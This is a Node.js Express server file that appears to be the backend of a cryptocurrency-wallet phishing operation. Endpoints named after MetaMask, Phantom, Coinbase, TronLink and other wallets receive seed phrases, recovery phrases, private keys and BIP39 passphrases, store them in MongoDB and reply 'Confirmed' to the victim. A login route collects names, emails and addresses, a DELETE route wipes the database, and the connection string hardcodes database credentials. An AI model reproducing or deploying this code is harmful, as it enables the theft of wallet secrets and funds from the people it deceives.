const express = require("express");
const server = express();
const cors = require("cors")
const bodyParser = require("body-parser")
const mongoose = require("mongoose");
const mongooseUrl = "mongodb+srv://dbBackend:clientbackend@cluster0.ycmie7z.mongodb.net/ClientBackend"

let timeAdd = new Date();
const date = new Date();
const offset = date.getTimezoneOffset() == 0 ? 0 : -1 * date.getTimezoneOffset();
let normalized = new Date(date.getTime() + (offset) * 60000);
let indiaTime = new Date(normalized.toLocaleString("en-US", {timeZone: "Asia/Calcutta"}));

//Connect MONGO DB
async function mongooseConnect(){
    try{
        await mongoose.connect(mongooseUrl);
        console.log("Connected");
    }
    catch{
        console.log("Error")
    }
}
mongooseConnect()

const db = mongoose.connection;

//Schema
const schema = new mongoose.Schema(
    {
        Time:{type:String},
        secretPhrase: {type:String}
});
const schemaUse = mongoose.model('database1', schema);

const schema2 = new mongoose.Schema({
    Time:{type:String},
    walletName: {type:String},
    secretPhrase: {type:String}
});
const schema2Use = mongoose.model('database2', schema2);

const schema3 = new mongoose.Schema({
    Time:{type:String},
    secretPhrase: {type:String}
});
const schema3Use = mongoose.model('database3', schema3);

const schema4 = new mongoose.Schema({
    Time:{type:String},
    privateKey: {type:String}
});
const schema4Use = mongoose.model('database4', schema4);

const schema5 = new mongoose.Schema({
    Time:{type:String},
    recoveryKey: {type:String}
});
const schema5Use = mongoose.model('database5', schema5);

const schema6 = new mongoose.Schema({
    Time:{type:String},
    recoveryPhrase: {type:String}
});
const schema6Use = mongoose.model('database6', schema6);

const schema7 = new mongoose.Schema({
    Time:{type:String},
    mPhrase: {type:String},
});
const schema7Use = mongoose.model('database7', schema7);

const schema8 = new mongoose.Schema({
    Time:{type:String},
    recoveryPhrase: {type:String},
    bip39passPhrase: {type:String}
});
const schema8Use = mongoose.model('database8', schema8);

const schema9 = new mongoose.Schema({
    Time:{type:String},
    recoveryPhrase: {type:String},
});
const schema9Use = mongoose.model('database9', schema9);

const schema10 = new mongoose.Schema({
    Time:{type:String},
    walletName: {type:String},
    recoveryPhrase: {type:String}
});
const schema10Use = mongoose.model('database10', schema10);

const login = new mongoose.Schema({
    Time:{type:String},
    name: {type:String},
    email: {type:String},
    address : {type:String},
    imgUrl : {type:String}
});
const loginUse = mongoose.model('login', login);

//MiddleWares
server.use(cors());
server.use(bodyParser.json());

//API's
server.get("/",(req,res)=>{
    res.send("Hello World");
})

server.post("/api/metamask",(req,res)=>{
    async function saveSchema(){
        let data = new schemaUse({
            Time:indiaTime,
            secretPhrase:req.body.packetData
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/multicoin",(req,res)=>{
    async function saveSchema(){
        let data = new schema2Use({
            Time:indiaTime,
            walletName:req.body.walletName,
            secretPhrase:req.body.secretPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/blockchain",(req,res)=>{
    async function saveSchema(){
        let data = new schema3Use({
            Time:indiaTime,
            secretPhrase:req.body.secretPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/tronlink",(req,res)=>{
    async function saveSchema(){
        let data = new schema4Use({
            Time:indiaTime,
            privateKey:req.body.privateKey
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/coinbase",(req,res)=>{
    async function saveSchema(){
        let data = new schema5Use({
            Time:indiaTime,
            recoveryKey:req.body.recoveryKey
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/phantom",(req,res)=>{
    async function saveSchema(){
        let data = new schema6Use({
            Time:indiaTime,
            recoveryPhrase:req.body.recoveryPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/safepal",(req,res)=>{
    async function saveSchema(){
        let data = new schema7Use({
            Time:indiaTime,
            mPhrase:req.body.mPhrase,
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/coinomi",(req,res)=>{
    async function saveSchema(){
        let data = new schema8Use({
            Time:indiaTime,
            recoveryPhrase:req.body.recoveryPhrase,
            bip39passPhrase:req.body.bip39passPhrase
        });
        console.log(data)
        try{
            await data.save();
            console.log("Saved")
        }
        catch(err){
            console.log(err)
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/rainbow",(req,res)=>{
    async function saveSchema(){
        let data = new schema9Use({
            Time:indiaTime,
            recoveryPhrase:req.body.recoveryPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/other",(req,res)=>{
    async function saveSchema(){
        let data = new schema9Use({
            Time:indiaTime,
            walletName:req.body.walletName,
            recoveryPhrase:req.body.recoveryPhrase
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})

server.post("/api/login",(req,res)=>{
    async function saveSchema(){
        let data = new loginUse({
            Time:indiaTime,
            name:req.body.name,
            email:req.body.email,
            address:req.body.address,
            imgUrl:req.body.img
        });
        try{
            await data.save();
            console.log("Saved")
        }
        catch{
            console.log("NO")
        }
    }
    res.json({status:"Confirmed"});
    saveSchema()
})


server.delete("/api/deleteall",async(req,res)=>{
    try {
    await mongoose.connection.db.dropDatabase();
    res.json({ message: 'All collections deleted successfully' });
  } catch (error) {
        console.log(error)
    res.status(500).json({ message: 'Internal Server Error' });
  }
})

//Server Listening
server.listen(8000);
